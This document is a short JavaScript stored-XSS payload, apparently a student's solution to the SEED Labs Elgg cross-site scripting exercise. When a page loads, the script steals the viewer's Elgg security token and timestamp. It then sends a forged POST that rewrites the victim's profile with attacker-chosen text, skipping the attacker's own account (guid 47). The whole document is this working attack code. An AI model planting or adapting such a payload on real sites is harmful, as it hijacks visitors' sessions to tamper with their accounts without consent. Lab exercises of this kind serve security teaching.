<script type="text/javascript">
	window.onload = function(){
        //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
        //and Security Token __elgg_token
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
        var token="&__elgg_token="+elgg.security.token.__elgg_token;
        //Construct the content of your url.
        //found in request url while posting edit profile request
        var sendurl="http://www.xsslabelgg.com/action/profile/edit"; //FILL IN
        //observed content in the post request body
        var content="__elgg_token="+token+"&__elgg_ts="+ts+"&name="+elgg.session.user.name+"&description=1605042&accesslevel[description]=1&briefdescription=Shukti is awesome&accesslevel[briefdescription]=1&location=Konoha&accesslevel[location]=1&interests=Gaming&accesslevel[interests]=1&skills=Sleeping&accesslevel[skills]=1&contactemail=Something@Something.com&accesslevel[contactemail]=1&phone=01521443808&accesslevel[phone]=1&mobile=8899&accesslevel[mobile]=1&website=http://www.fbac.com&accesslevel[website]=1&twitter=tytt&accesslevel[twitter]=1&guid="+elgg.session.user.guid;
        //FILL IN
        if(elgg.session.user.guid!=47)
        {
            //Create and send Ajax request to modify profile
            var Ajax=null;
            Ajax=new XMLHttpRequest();
            Ajax.open("POST",sendurl,true);
            Ajax.setRequestHeader("Host","www.xsslabelgg.com");
            Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
            Ajax.send(content);
        }
	}
</script>